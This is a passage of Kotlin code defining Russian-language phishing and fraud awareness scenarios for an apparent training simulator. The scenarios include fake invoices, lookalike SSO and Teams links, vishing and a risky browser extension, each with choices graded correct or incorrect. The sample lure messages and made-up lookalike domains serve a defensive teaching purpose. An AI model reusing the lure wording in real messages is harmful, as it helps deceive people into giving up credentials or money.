                            explanationWhenChosen = "Ответ уходит на тот же почтовый ящик, который может контролировать мошенник; «официальный» адрес в переписке легко подделать. Нужен звонок по номеру, который был известен до письма.",
                            scoreDelta = 0,
                        ),
                    ),
                    uiKind = StepUiKind.EMAIL_CLIENT,
                    emailSubject = "Срочно: новые реквизиты для счёта № 4482",
                    emailFrom = "billing@acme-supplier-invoice.com",
                    investigationPanels = listOf(
                        InternalInvestigationPanel(
                            id = "vb-1-dom",
                            title = "Сверка домена",
                            body = "В договоре — почта @acme-supplier.com. Домен acme-supplier-invoice.com выглядит похоже, но это отдельная регистрация, типичный приём typosquatting.",
                        ),
                    ),
                    investigationBonusThreshold = 1,
                    hotspots = listOf(
                        InternalHotspot(
                            id = "vb-1-h-a",
                            label = "Внести реквизиты в ERP и оплатить по письму",
                            choiceId = "vb-1-a",
                            variant = "ACTION",
                        ),
                        InternalHotspot(
                            id = "vb-1-h-b",
                            label = "Позвонить в бухгалтерию по номеру из договора",
                            choiceId = "vb-1-b",
                            variant = "ACTION",
                        ),
                        InternalHotspot(
                            id = "vb-1-h-c",
                            label = "Попросить подтверждение ответом на письмо",
                            choiceId = "vb-1-c",
                            variant = "REPLY",
                        ),
                    ),
                    narrativeNoise = """
                        ---
                        С уважением, отдел сопровождения · Acme Supplier Ltd.
                        Письмо сформировано автоматически. Не отвечайте на этот адрес.
                    """.trimIndent(),
                    pressureSeconds = 60,
                ),
                InternalStep(
                    id = "vb-2",
                    situationBrief = "Подделка подтвердилась. Нужно корректно завершить реакцию.",
                    narrative = "Вы не меняли реквизиты по этому письму. Какие действия уместны дальше?",
                    choices = listOf(
                        InternalChoice(
                            id = "vb-2-a",
                            label = "Оформить инцидент по регламенту: уведомить ИБ и финансы, сохранить письмо с полными заголовками",
                            correct = true,
                            explanationWhenChosen = "Так фиксируется атака, можно заблокировать домен, предупредить коллег и накопить данные для расследования.",
                            scoreDelta = 3,
                        ),
                        InternalChoice(
                            id = "vb-2-b",
                            label = "Удалить письмо и забыть — платёж всё равно не проводили",
                            correct = false,
                            explanationWhenChosen = "Без учёта инцидента та же схема может сработать у другого сотрудника; ИБ не узнает о кампании.",
                            scoreDelta = 0,
                        ),
                        InternalChoice(
                            id = "vb-2-c",
                            label = "Спросить в открытом корпоративном чате: «Кто-нибудь получал такое письмо?»",
                            correct = false,
                            explanationWhenChosen = "Публичный чат раздувает панику и раскрывает внутренние процедуры. Надёжнее тикет в ИБ и целевое предупреждение отдела закупок.",
                            scoreDelta = 0,
                        ),
                    ),
                    uiKind = StepUiKind.GENERIC,
                ),
            ),
        )

        /** Уход с площадки объявлений: фейковая «безопасная оплата» и давление. */
        fun marketplaceOffPlatform(): InternalScenario = InternalScenario(
            id = "marketplace-off-platform",
            title = "Покупатель просит уйти с Avito",
            type = ScenarioType.SOCIAL,
            description = "Реальная схема: перевод на «гаранта» вне площадки, поддельные страницы оплаты, потеря денег и товара.",
            attackTypeLabel = "Мошенничество вне площадки",
            steps = listOf(
                InternalStep(
                    id = "mo-1",
                    situationBrief = """
                        Вы продаёте технику на площадке объявлений. В ленте переписки покупатель предлагает перейти в мессенджер и оплатить через «безопасную ссылку» не на сайте Avito.
                    """.trimIndent(),
                    narrative = """
                        Сообщение: «Давайте в Telegram, так быстрее. Вот ссылка на защищённую оплату с эскроу — как у Avito, только без комиссии».
                        Ссылка ведёт на avito-safe-pay.ru (не домен площадки).
                    """.trimIndent(),
                    choices = listOf(
                        InternalChoice(
                            id = "mo-1-a",
                            label = "Перейду по ссылке — если похоже на эскроу, можно оплатить",
                            correct = false,
                            explanationWhenChosen = "Эскроу и защита сделки работают только внутри официального приложения или сайта площадки.",
                            scoreDelta = 0,
                            criticalIfWrong = true,
                            consequenceBeat = "Страница сняла данные карты. Банк может отказать в chargeback, если вы сами ввели данные на поддельном сайте.",
                        ),
                        InternalChoice(
                            id = "mo-1-b",
                            label = "Откажусь от сделки вне площадки и оставлю оплату только через официальный сервис объявлений",
                            correct = true,
                            explanationWhenChosen = "Правило: деньги и доставка — только через механизмы, которые даёт площадка.",
                            scoreDelta = 4,
                        ),
                        InternalChoice(
                            id = "mo-1-c",
                            label = "Скину номер телефона, чтобы «договориться» быстрее",
                            correct = false,
                            explanationWhenChosen = "Уход в личку убирает защиту сделки и открывает путь к социнженерии.",
                            scoreDelta = 0,
                        ),
                    ),
                    uiKind = StepUiKind.SOCIAL_NOTIFICATION,
                    investigationPanels = listOf(
                        InternalInvestigationPanel(
                            id = "mo-1-who",
                            title = "Профиль покупателя",
                            body = "Аккаунт зарегистрирован сегодня, отзывов нет, аватар стоковый — типичный одноразовый профиль для массовой рассылки.",
                        ),
                    ),
                    investigationBonusThreshold = 1,
                    hotspots = listOf(
                        InternalHotspot(
                            id = "mo-1-link",
                            label = "Ссылка «безопасная оплата»",
                            choiceId = "mo-1-a",
                            variant = "LINK",
                        ),
                        InternalHotspot(
                            id = "mo-1-ok",
                            label = "Только официальная оплата на площадке",
                            choiceId = "mo-1-b",
                            variant = "ACTION",
                        ),
                        InternalHotspot(
                            id = "mo-1-phone",
                            label = "Дать телефон в личку",
                            choiceId = "mo-1-c",
                            variant = "ACTION",
                        ),
                    ),
                ),
                InternalStep(
                    id = "mo-2",
                    situationBrief = "Покупатель давит: «скидка только если переведёте напрямую сегодня».",
                    narrative = "Как ответить, не теряя деньги?",
                    choices = listOf(
                        InternalChoice(
                            id = "mo-2-a",
                            label = "Соглашусь на прямой перевод ради скидки — проверю получателя по ФИО",
                            correct = false,
                            explanationWhenChosen = "Скидка под давлением — классический триггер. ФИО в реквизитах легко подделать под легенду.",
                            scoreDelta = 0,
                            criticalIfWrong = true,
                        ),
                        InternalChoice(
                            id = "mo-2-b",
                            label = "Сохраню условия только внутри объявления; при отказе от защиты площадки — прекращу сделку",
                            correct = true,
                            explanationWhenChosen = "Жёсткая граница снижает риск и отсеивает мошенников.",
                            scoreDelta = 4,
                        ),
                        InternalChoice(
                            id = "mo-2-c",
                            label = "Попрошу скрин его паспорта для уверенности",
                            correct = false,
                            explanationWhenChosen = "Фото документов легко подделать; это не заменяет защищённую сделку.",
                            scoreDelta = 0,
                        ),
                    ),
                    uiKind = StepUiKind.SOCIAL_NOTIFICATION,
                ),
            ),
        )

        /** Фишинг «корпоративного портала» и опросов HR — как в атаках на учётные записи Microsoft 365. */
        fun hrPortalPhish(): InternalScenario = InternalScenario(
            id = "hr-portal-phish",
            title = "Обязательный «опрос HR» по ссылке",
            type = ScenarioType.EMAIL,
            description = "Реальные кампании: письмо про обязательный опрос или обучение, вход через поддельный SSO на похожем домене.",
            attackTypeLabel = "Фишинг (поддельный портал / SSO)",
            steps = listOf(
                InternalStep(
                    id = "hs-1",
                    situationBrief = """
                        В почте письмо про обязательный корпоративный опрос до конца недели.
                        Отправитель и тема выглядят срочно и официально.
                    """.trimIndent(),
                    narrative = """
                        От: hr-notifications@staff-survey-portal.xyz
                        Тема: «Просрочите — доступ к почте ограничат: опрос удовлетворённости».
                        В тексте кнопка «Войти через корпоративный аккаунт (SSO)».
                    """.trimIndent(),
                    choices = listOf(
                        InternalChoice(
                            id = "hs-1-a",
                            label = "Войду по кнопке из письма — опрос обязательный",
                            correct = false,
                            explanationWhenChosen = "Вход по ссылке из непроверенного письма — основной вектор кражи паролей к Microsoft 365 и аналогам.",
                            scoreDelta = 0,
                            criticalIfWrong = true,
                            consequenceBeat = "Поддельная страница SSO передала учётные данные атакующим. Возможен доступ к почте и файлам.",
                        ),
                        InternalChoice(
                            id = "hs-1-b",
                            label = "Открою портал сам: через закладку или адрес из внутренней wiki, не из письма",
                            correct = true,
                            explanationWhenChosen = "Правильно: доверять только самостоятельно открытому официальному URL.",
                            scoreDelta = 4,
                        ),
                        InternalChoice(
                            id = "hs-1-c",
                            label = "Перешлю коллегам, пусть тоже пройдут",
                            correct = false,
                            explanationWhenChosen = "Распространение подозрительного письма увеличивает число жертв. Лучше пометить как фишинг и написать в ИБ.",
                            scoreDelta = 0,
                        ),
                    ),
                    uiKind = StepUiKind.EMAIL_CLIENT,
                    emailSubject = "Просрочите — доступ к почте ограничат: опрос удовлетворённости",
                    emailFrom = "hr-notifications@staff-survey-portal.xyz",
                    investigationPanels = listOf(
                        InternalInvestigationPanel(
                            id = "hs-1-spf",
                            title = "Домен отправителя",
                            body = "staff-survey-portal.xyz — публичный дешёвый TLD, не корпоративный домен вашей организации. Опросы обычно приходят с внутреннего адреса или известного поставщика.",
                        ),
                    ),
                    investigationBonusThreshold = 1,
                    hotspots = listOf(
                        InternalHotspot(
                            id = "hs-1-sso",
                            label = "Кнопка «Войти через SSO»",
                            choiceId = "hs-1-a",
                            variant = "LINK",
                        ),
                        InternalHotspot(
                            id = "hs-1-manual",
                            label = "Открыть портал из закладки",
                            choiceId = "hs-1-b",
                            variant = "ACTION",
                        ),
                        InternalHotspot(
                            id = "hs-1-fwd",
                            label = "Переслать коллегам",
                            choiceId = "hs-1-c",
                            variant = "ACTION",
                        ),
                    ),
                    pressureSeconds = 55,
                ),
                InternalStep(
                    id = "hs-2",
                    situationBrief = "Нужно отличить настоящий адрес входа от поддельного, как в адресной строке браузера.",
                    narrative = "Сравните URL. Какой вариант соответствует безопасному решению — не вводить пароль на поддельном сайте?",
                    choices = listOf(
                        InternalChoice(
                            id = "hs-2-a",
                            label = "Готов ввести пароль, если открыл левый адрес из сравнения",
                            correct = false,
                            explanationWhenChosen = "Поддельные SSO часто копируют дизайн. Решает только доверенный домен организации.",
                            scoreDelta = 0,
                            criticalIfWrong = true,
                        ),
                        InternalChoice(
                            id = "hs-2-b",
                            label = "Пароль только на официальном поддомене организации (справа), левый закрываю",
                            correct = true,
                            explanationWhenChosen = "Верно: *.company.example.com в зоне организации; посторонний домен — нет.",
                            scoreDelta = 4,
                        ),
                        InternalChoice(
                            id = "hs-2-c",
                            label = "Попробую оба — смотрю, где красивее страница входа",
                            correct = false,
                            explanationWhenChosen = "Визуальное сходство не гарантирует подлинность.",
                            scoreDelta = 0,
                            criticalIfWrong = true,
                        ),
                    ),
                    uiKind = StepUiKind.MINI_URL_COMPARE,
                    investigationPanels = listOf(
                        InternalInvestigationPanel(
                            id = "hs-2-tip",
                            title = "Зона домена",
                            body = "Корпоративный SSO обычно на поддомене вашей организации и с корпоративным TLS-сертификатом. Случайный .tk / .xyz с «login» в пути — подозрительно.",
                        ),
                    ),
                    investigationBonusThreshold = 1,
                    urlCompareGame = InternalUrlCompareGame(
                        leftUrl = "https://staff-portal-login.tk/corp/sso?ref=hr",
                        rightUrl = "https://portal.company.example.com/login",
                        leftChoiceId = "hs-2-a",
                        rightChoiceId = "hs-2-b",
                        caption = "Слева — подозрительный хост (.tk), справа — поддомен организации. Выберите действие, соответствующее безопасному варианту.",
                    ),
                    narrativeNoise = "Подсказка: проверьте корневое имя хоста, а не только логотип на странице.",
                    pressureSeconds = 45,
                ),
            ),
        )

        /** Поддельная «IT-поддержка» и срочная смена пароля — как в credential harvesting. */
        fun itSupportLookalike(): InternalScenario = InternalScenario(
            id = "it-support-lookalike",
            title = "«IT-поддержка»: пароль истекает через час",
            type = ScenarioType.EMAIL,
            description = "Распространённый фишинг: письмо от похожего на сервисный адрес, срочность и ссылка на «сброс пароля» вне SSO.",
            attackTypeLabel = "Фишинг (поддельная техподдержка)",
            steps = listOf(
                InternalStep(
                    id = "il-1",
                    situationBrief = "В почте уведомление якобы от корпоративной IT-службы о скором блокировании учётной записи.",
                    narrative = """
                        От: microsoft-365-security@outlook-verify.co
                        Тема: «Действие требуется: срок действия пароля истекает через 60 минут».
                        Текст: «Чтобы избежать блокировки, подтвердите учётную запись по ссылке». Ссылка ведёт на сторонний домен.
                    """.trimIndent(),
                    choices = listOf(
                        InternalChoice(
                            id = "il-1-a",
                            label = "Перейду по ссылке и сменю пароль — блокировка помешает работе",
                            correct = false,
                            explanationWhenChosen = "Срочность и «технический» отправитель с публичного домена — признак фишинга. Смена пароля — только через официальный портал или Ctrl+Alt+Del / SSO.",
                            scoreDelta = 0,
                            criticalIfWrong = true,
                            consequenceBeat = "Пароль и возможно MFA-коды утекли. Нужна немедленная смена через легитимный канал и тикет в ИБ.",
                        ),
                        InternalChoice(
                            id = "il-1-b",
                            label = "Игнорирую ссылку; при сомнении открою портал сброса через известный корпоративный адрес или helpdesk",
                            correct = true,
                            explanationWhenChosen = "Правильно: самостоятельно открытый доверенный канал.",
                            scoreDelta = 4,
                        ),
                        InternalChoice(
                            id = "il-1-c",
                            label = "Отвечу на письмо и пришлю логин для проверки",
                            correct = false,
                            explanationWhenChosen = "Никогда не отправляйте учётные данные по email. Это усиливает компрометацию.",
                            scoreDelta = 0,
                            criticalIfWrong = true,
                        ),
                    ),
                    uiKind = StepUiKind.EMAIL_CLIENT,
                    emailSubject = "Действие требуется: срок действия пароля истекает через 60 минут",
                    emailFrom = "microsoft-365-security@outlook-verify.co",
                    hotspots = listOf(
                        InternalHotspot(
                            id = "il-1-link",
                            label = "Ссылка «подтвердить учётную запись»",
                            choiceId = "il-1-a",
                            variant = "LINK",
                        ),
                        InternalHotspot(
                            id = "il-1-portal",
                            label = "Открыть официальный портал / helpdesk",
                            choiceId = "il-1-b",
                            variant = "ACTION",
                        ),
                        InternalHotspot(
                            id = "il-1-reply",
                            label = "Ответить с логином",
                            choiceId = "il-1-c",
                            variant = "REPLY",
                        ),
                    ),
                    narrativeNoise = "Мелким шрифтом: «Если вы не запрашивали письмо, проигнорируйте» — типичная вставка, не делающая письмо безопасным.",
                    pressureSeconds = 70,
                ),
                InternalStep(
                    id = "il-2",
                    situationBrief = "Сообщить коллегам без паники.",
                    narrative = "Как лучше предупредить отдел о такой рассылке?",
                    choices = listOf(
                        InternalChoice(
                            id = "il-2-a",
                            label = "Короткое объявление в корпоративном канале с примером темы и «не кликать по ссылке»",
                            correct = true,
                            explanationWhenChosen = "Предупреждение без распространения вредоносной ссылки снижает число жертв.",
                            scoreDelta = 3,
                        ),
                        InternalChoice(
                            id = "il-2-b",
                            label = "Переслать всем исходное письмо целиком",
                            correct = false,
                            explanationWhenChosen = "Пересылка может содержать трекинг-пиксели и вредоносные вложения. Лучше текстовое предупреждение и тикет в ИБ.",
                            scoreDelta = 0,
                        ),
                        InternalChoice(
                            id = "il-2-c",
                            label = "Ничего не писать — кто умный, сам разберётся",
                            correct = false,
                            explanationWhenChosen = "Коллективное информирование — часть защиты.",
                            scoreDelta = 0,
                        ),
                    ),
                    uiKind = StepUiKind.GENERIC,
                ),
            ),
        )

        /** Vishing / поддельный «голос руководителя» и срочный перевод — для SOC. */
        fun execWireVishing(): InternalScenario = InternalScenario(
            id = "exec-wire-vishing",
            title = "Звонок «от финдира»: срочный перевод",
            type = ScenarioType.EMAIL,
            description = "Реальные кейсы: синтез голоса или подмена номера, знание контекста проектов, давление перевести на «новый счёт контрагента».",
            attackTypeLabel = "Вишинг / социальная инженерия",
            hubChannel = ScenarioHubChannel.SECURITY,
            steps = listOf(
                InternalStep(
                    id = "ev-1",
                    situationBrief = """
                        В тикет-систему ИБ поступило обращение из бухгалтерии: сотруднику позвонили, представились финансовым директором,
                        знали названия текущих проектов и попросили срочно инициировать платёж на новые реквизиты «по устной договорённости».
                    """.trimIndent(),
                    narrative = """
                        Звонок шёл с незнакомого мобильного; голос показался знакомым. Просили не отвлекать руководителя в чате — «он в переговорах».
                        Какой первый совет дать сотруднику?
                    """.trimIndent(),
                    choices = listOf(
                        InternalChoice(
                            id = "ev-1-a",
                            label = "Выполнить перевод — голос совпал, проекты названы верно",
                            correct = false,
                            explanationWhenChosen = "Deepfake и vishing используют открытые данные. Срочные переводы без второго канала запрещены политикой.",
                            scoreDelta = 0,
                            criticalIfWrong = true,
                            consequenceBeat = "Крупный перевод ушёл мошенникам. Расследование и регуляторы подключаются к инциденту.",
                        ),
                        InternalChoice(
                            id = "ev-1-b",
                            label = "Перезвонить руководителю по внутреннему номеру из корпоративного справочника, не перезванивая на номер «звонящего»",
                            correct = true,
                            explanationWhenChosen = "Независимая верификация через известный канал — единственный надёжный ответ на vishing.",
                            scoreDelta = 4,
                        ),
                        InternalChoice(
                            id = "ev-1-c",
                            label = "Написать руководителю в Telegram по номеру из письма",
                            correct = false,
                            explanationWhenChosen = "Мессенджер и номер из непроверенного источника могут контролироваться атакующими.",
                            scoreDelta = 0,
                            criticalIfWrong = true,
                        ),
                    ),
                    uiKind = StepUiKind.DESK_TICKET,
                    emailSubject = "Инцидент: звонок «от финдира» и срочный перевод",
                    emailFrom = "Портал ИБ · очередь: платежи",
                    investigationPanels = listOf(
                        InternalInvestigationPanel(
                            id = "ev-1-vish",
                            title = "Vishing и deepfake",
                            body = "В 2023–2025 гг. зафиксированы случаи синтеза голоса руководителя и подмены CLI. Контекст проектов берут из утечек и LinkedIn.",
                        ),
                    ),
                    investigationBonusThreshold = 1,
                    hotspots = listOf(
                        InternalHotspot(
                            id = "ev-1-pay",
                            label = "Инициировать перевод по звонку",
                            choiceId = "ev-1-a",
                            variant = "ACTION",
                        ),
                        InternalHotspot(
                            id = "ev-1-call",
                            label = "Перезвонить по справочнику",
                            choiceId = "ev-1-b",
                            variant = "ACTION",
                        ),
                        InternalHotspot(
                            id = "ev-1-tg",
                            label = "Написать в Telegram",
                            choiceId = "ev-1-c",
                            variant = "ACTION",
                        ),
                    ),
                ),
                InternalStep(
                    id = "ev-2",
                    situationBrief = "Нужна организационная мера после инцидента.",
                    narrative = "Что усилит защиту от повторения такой схемы?",
                    choices = listOf(
                        InternalChoice(
                            id = "ev-2-a",
                            label = "Политика: любые изменения платёжных инструкций — только с подтверждением вторым каналом (в т.ч. для «устных» поручений)",
                            correct = true,
                            explanationWhenChosen = "Сочетание регламента и технических контролей (лимиты, двойное подписание) снижает ущерб.",
                            scoreDelta = 4,
                        ),
                        InternalChoice(
                            id = "ev-2-b",
                            label = "Запретить удалённую работу бухгалтерии",
                            correct = false,
                            explanationWhenChosen = "Не адресует корень проблемы; важны процедуры верификации, а не локация.",
                            scoreDelta = 0,
                        ),
                        InternalChoice(
                            id = "ev-2-c",
                            label = "Доверять звонку, если номер начинается с кода города офиса",
                            correct = false,
                            explanationWhenChosen = "Подмена номера (spoofing) обходит такие эвристики.",
                            scoreDelta = 0,
                        ),
                    ),
                    uiKind = StepUiKind.GENERIC,
                ),
            ),
        )

        /** Мессенджер: переслано из канала со «срочной» ссылкой. */
        fun messengerForwardedPhish(): InternalScenario = InternalScenario(
            id = "messenger-forwarded-phish",
            title = "Мессенджер: переслано из канала",
            type = ScenarioType.SOCIAL,
            description = "В рабочем чате переслали пост из публичного канала с «бонусом для сотрудников» и ссылкой на сторонний домен.",
            attackTypeLabel = "Фишинг (мессенджер)",
            hubChannel = ScenarioHubChannel.SECURITY,
            steps = listOf(
                InternalStep(
                    id = "mfp-1",
                    situationBrief = """
                        Вы в корпоративном мессенджере. В общем чате команды появилось пересланное сообщение из стороннего канала:
                        обещание «бонуса» и ссылка, которой вы не доверяете.
                    """.trimIndent(),
                    narrative = """
                        Перешли из нашего канала 🔥

                        Личный кабинет бонусов только для штата:
                        https://guardsim-bonus-login.tel/verify

                        Регистрация до 18:00, иначе слот сгорит. Проверено HR (говорят в посте).
                    """.trimIndent(),
                    narrativeNoise = "Антон: завтра стендап в 10:00\nЛена: ок, буду",
                    choices = listOf(
                        InternalChoice(
                            id = "mfp-1-a",
                            label = "Перейду по ссылке — вдруг корпоративная программа",
                            correct = false,
                            explanationWhenChosen = "Пересылка из публичного канала и давление по времени — типичная связка. Легитимные бонусы оформляют через известные HR-порталы, не через случайные домены.",
                            scoreDelta = 0,
                            criticalIfWrong = true,
                            consequenceBeat = "Учётные данные могли утечь на поддельную страницу входа.",
                        ),
                        InternalChoice(
                            id = "mfp-1-b",
                            label = "Не перехожу; сообщу в ИБ / отмечу канал как ненадёжный и предупрежу чат текстом без ссылки",
                            correct = true,
                            explanationWhenChosen = "Верно: не кликать, предупредить коллег без распространения вредоносной ссылки, при необходимости — тикет в ИБ.",
                            scoreDelta = 4,
                        ),
                        InternalChoice(
                            id = "mfp-1-c",
                            label = "Перешлю ссылку всем в отделе, пусть сами решают",
                            correct = false,
                            explanationWhenChosen = "Массовая пересылка увеличивает число кликов. Лучше краткое предупреждение без активной ссылки.",
                            scoreDelta = 0,
                        ),
                    ),
                    uiKind = StepUiKind.CHAT_MESSENGER,
                    simChatTitle = "Команда · Проект Альфа",
                    simChatForwardFrom = "Канал «IT-выгоды и лайфхаки»",
                    simChatSenderLabel = "Неизвестный контакт · переслано",
                    investigationPanels = listOf(
                        InternalInvestigationPanel(
                            id = "mfp-1-hr",
                            title = "Как устроены бонусы",
                            body = "Корпоративные бонусы и компенсации публикуются во внутреннем HR-портале или официальном письме с домена компании — не из случайных Telegram-каналов.",
                        ),
                    ),
                    investigationBonusThreshold = 1,
                    hotspots = listOf(
                        InternalHotspot(
                            id = "mfp-1-link",
                            label = "Открыть ссылку guardsim-bonus-login.tel",
                            choiceId = "mfp-1-a",
                            variant = "LINK",
                        ),
                        InternalHotspot(
                            id = "mfp-1-safe",
                            label = "Предупредить чат и не переходить",
                            choiceId = "mfp-1-b",
                            variant = "ACTION",
                        ),
                        InternalHotspot(
                            id = "mfp-1-fwd",
                            label = "Переслать ссылку отделу",
                            choiceId = "mfp-1-c",
                            variant = "SHARE",
                        ),
                    ),
                    pressureSeconds = 55,
                ),
            ),
        )

        /** Календарь: фейковое приглашение Teams/Zoom со ссылкой в описании. */
        fun calendarFakeTeamsInvite(): InternalScenario = InternalScenario(
            id = "calendar-fake-teams-invite",
            title = "Календарь: подозрительное приглашение",
            type = ScenarioType.EMAIL,
            description = "В календаре появилось приглашение на «обязательную» встречу с угрозой блокировки и ссылкой на сторонний домен.",
            attackTypeLabel = "Фишинг (календарь / приглашение)",
            hubChannel = ScenarioHubChannel.SECURITY,
            steps = listOf(
                InternalStep(
                    id = "cft-1",
                    situationBrief = """
                        Вы открыли виджет календаря. Новое приглашение якобы от IT-службы: срочная проверка учётных записей в Teams,
                        в описании — ссылка «подключиться к конференции».
                    """.trimIndent(),
                    narrative = """
                        Все руководители обязаны подключиться для проверки MFA и лицензий.

                        Присоединиться к конференции:
                        https://teams-verify.co/join/meeting-urgent?id=7f3a9b

                        Неявка в течение 2 часов = временная приостановка учётной записи по регламенту безопасности.
                    """.trimIndent(),
                    choices = listOf(
                        InternalChoice(
                            id = "cft-1-a",
                            label = "Сразу открою ссылку из описания — не хочу блокировки",
                            correct = false,
                            explanationWhenChosen = "Домен teams-verify.co не принадлежит Microsoft. Приглашения в Teams из экосистемы Microsoft используют официальные домены и обычно приходят через корпоративную почту с проверяемым отправителем.",
                            scoreDelta = 0,
                            criticalIfWrong = true,
                            consequenceBeat = "Возможен ввод учётных данных на поддельной странице. Сообщите в ИБ и смените пароль через официальный портал.",
                        ),
                        InternalChoice(
                            id = "cft-1-b",
                            label = "Проверю организатора и домен; открою встречу только из корпоративного календаря / напишу в IT по известному номеру",
                            correct = true,
                            explanationWhenChosen = "Верно: верификация вторым каналом и отказ от клика по ссылке из подозрительного приглашения.",
                            scoreDelta = 4,
                        ),
                        InternalChoice(
                            id = "cft-1-c",
                            label = "Приму приглашение и отвечу «Maybe» — так безопаснее",
                            correct = false,
                            explanationWhenChosen = "Ответ «Maybe» всё равно может подтвердить активность ящика и не устраняет риск фишинга. Нужна проверка источника.",
                            scoreDelta = 0,
                        ),
                    ),
                    uiKind = StepUiKind.CALENDAR_INVITE,
                    emailSubject = "Обязательно: проверка учётных записей Microsoft Teams",
                    emailFrom = "IT ServiceDesk <servicedesk-notify@teams-verify.co>",
                    simCalendarWhen = "Сегодня, 15:30–16:00 (Europe/Moscow)",
                    simCalendarWhere = "Онлайн — ссылка в описании приглашения",
                    investigationPanels = listOf(
                        InternalInvestigationPanel(
                            id = "cft-1-dom",
                            title = "Домен",
                            body = "Официальные письма Microsoft 365 обычно идут с доменов microsoft.com, protection.outlook.com или вашего корпоративного тенанта — не teams-verify.co.",
                        ),
                    ),
                    investigationBonusThreshold = 1,
                    hotspots = listOf(
                        InternalHotspot(
                            id = "cft-1-join",
                            label = "Кнопка «Подключиться к конференции»",
                            choiceId = "cft-1-a",
                            variant = "LINK",
                        ),
                        InternalHotspot(
                            id = "cft-1-check",
                            label = "Проверить через IT / корпоративный календарь",
                            choiceId = "cft-1-b",
                            variant = "ACTION",
                        ),
                        InternalHotspot(
                            id = "cft-1-maybe",
                            label = "Ответить «Возможно»",
                            choiceId = "cft-1-c",
                            variant = "REPLY",
                        ),
                    ),
                    pressureSeconds = 60,
                ),
            ),
        )

        /** Магазин расширений: «для корпоративной почты» с чрезмерными разрешениями. */
        fun extensionCorporateMailTrap(): InternalScenario = InternalScenario(
            id = "extension-corporate-mail-trap",
            title = "Расширение для «корпоративной почты»",
            type = ScenarioType.EMAIL,
            description = "В выдаче магазина расширений — предложение установить дополнение для Gmail с опасным набором разрешений.",
            attackTypeLabel = "Вредоносное / опасное расширение",
            hubChannel = ScenarioHubChannel.SECURITY,
            steps = listOf(
                InternalStep(
                    id = "ecm-1",
                    situationBrief = """
                        Вы смотрите страницу расширения в каталоге (имитация Chrome Web Store).
                        Расширение обещает «защиту вложений» для корпоративной почты, но запрашивает доступ ко всем сайтам и данным почты.
                    """.trimIndent(),
                    narrative = """
                        Запрашиваемые разрешения:
                        • Читать и изменять все ваши данные на всех сайтах
                        • Читать, изменять и удалять письма в Gmail
                        • Доступ к контактам

                        12 400 пользователей · ★★★★☆ (4.3) · Обновлено вчера
                    """.trimIndent(),
                    simExtensionName = "MailShield Pro for Gmail",
                    simExtensionPublisher = "DevTools Media LLC",
                    simExtensionBlurb = "Умные уведомления о VIP-письмах и «безопасное» сканирование вложений в один клик.",
                    choices = listOf(
                        InternalChoice(
                            id = "ecm-1-a",
                            label = "Установлю — в описании написано про безопасность",
                            correct = false,
                            explanationWhenChosen = "Сочетание «все сайты» + полный доступ к почте — красный флаг. В организациях расширения согласуются через ИТ; случайные издатели не должны получать такие права.",
                            scoreDelta = 0,
                            criticalIfWrong = true,
                            consequenceBeat = "Расширение могло перехватывать сессии и переписку. Отзовите доступ, прогоните проверку рабочей станции.",
                        ),
                        InternalChoice(
                            id = "ecm-1-b",
                            label = "Не устанавливаю; уточню в ИТ, есть ли такое в белом списке, или сообщу о подозрительном расширении",
                            correct = true,
                            explanationWhenChosen = "Правильно: корпоративный контроль расширений и минимальные права.",
                            scoreDelta = 4,
                        ),
                        InternalChoice(
                            id = "ecm-1-c",
                            label = "Установлю только на личный профиль браузера — так не затронет работу",
                            correct = false,
                            explanationWhenChosen = "На одной машине личный и рабочий профиль часто разделяются неполно. Риск утечки и смешения данных остаётся.",
                            scoreDelta = 0,
                        ),
                    ),
                    uiKind = StepUiKind.EXTENSION_STORE,
                    investigationPanels = listOf(
                        InternalInvestigationPanel(
                            id = "ecm-1-pol",
                            title = "Политика",
                            body = "В компании допускаются только расширения из утверждённого списка ИТ. Запрос «читать все сайты» почти никогда не оправдан для почтового плагина.",
                        ),
                    ),
                    investigationBonusThreshold = 1,
                    hotspots = listOf(
                        InternalHotspot(
                            id = "ecm-1-install",
                            label = "Установить расширение",
                            choiceId = "ecm-1-a",
                            variant = "ACTION",
                        ),
                        InternalHotspot(
                            id = "ecm-1-it",
                            label = "Спросить ИБ / не устанавливать",
                            choiceId = "ecm-1-b",
                            variant = "ACTION",
                        ),
                        InternalHotspot(
                            id = "ecm-1-personal",
                            label = "Только в личный профиль",
                            choiceId = "ecm-1-c",
                            variant = "ACTION",
                        ),
                    ),
                ),
            ),
        )

        /** Мессенджер: переслано из официального HR-канала, ссылка на корпоративный интранет — угрозы нет. */
        fun messengerInternalBenign(): InternalScenario = InternalScenario(
            id = "messenger-internal-benign",
            title = "Мессенджер: объявление из официального канала",
            type = ScenarioType.SOCIAL,
            description = "В чате переслано сообщение из верифицированного внутреннего канала HR со ссылкой на интранет и спокойным текстом без давления.",
            attackTypeLabel = "Угрозы нет (легитимная коммуникация)",
            hubChannel = ScenarioHubChannel.SECURITY,
            steps = listOf(
                InternalStep(
                    id = "mib-1",
                    situationBrief = """
                        Вы в корпоративном мессенджере. Коллега переслал пост из официального канала «HR — объявления»:
                        напоминание о дедлайне подачи заявок на отпуск и ссылка на раздел интранета.
                    """.trimIndent(),
                    narrative = """
                        Переслано из корпоративного канала.

                        До 15 числа можно подать заявку на отпуск Q2 в системе self-service:
                        https://intranet.acme-corp.example/hr/leave-requests

                        Подробности и FAQ — на странице; поддержка HR: hr@acme-corp.example
                    """.trimIndent(),
                    narrativeNoise = "Марина: спасибо, оформлю на выходных\nОлег: встреча по ретро в 16:00",
                    choices = listOf(
                        InternalChoice(
                            id = "mib-1-a",
                            label = "Перейду по ссылке сразу, не глядя на адрес — ведь это наш чат",
                            correct = false,
                            explanationWhenChosen = "Даже в доверенном чате полезно на секунду проверить домен: привычка «смотреть на URL» защищает, когда канал подменят или перешлют не то.",
                            scoreDelta = 0,
                        ),
                        InternalChoice(
                            id = "mib-1-b",
                            label = "Проверю домен (intranet.acme-corp.example) и открою ссылку в корпоративном браузере — это обычная внутренняя процедура",
                            correct = true,
                            explanationWhenChosen = "Верно: признаки легитимности есть (официальный канал, корпоративный домен, нет срочности и угроз). Сверка домена — норма, паника не нужна.",
                            scoreDelta = 4,
                        ),
                        InternalChoice(
                            id = "mib-1-c",
                            label = "Скину ссылку в открытый внешний чат или соцсеть, чтобы обсудить с друзьями",
                            correct = false,
                            explanationWhenChosen = "Внутренние ссылки и регламенты не для публичных каналов — риск утечки и нарушения политики.",
                            scoreDelta = 0,
                        ),
                    ),
                    uiKind = StepUiKind.CHAT_MESSENGER,
                    simChatTitle = "Команда · HR и офис",
